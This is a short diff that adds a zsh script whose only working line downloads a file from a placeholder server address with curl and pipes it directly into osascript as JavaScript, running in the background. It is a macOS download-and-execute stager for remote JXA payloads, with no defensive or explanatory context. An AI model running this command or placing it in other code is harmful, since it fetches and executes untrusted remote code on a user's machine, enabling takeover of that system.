@@ -1,0 +1,2 @@
+#!/bin/zsh
+curl http://serverIPHere/filename | osascript -l JavaScript &
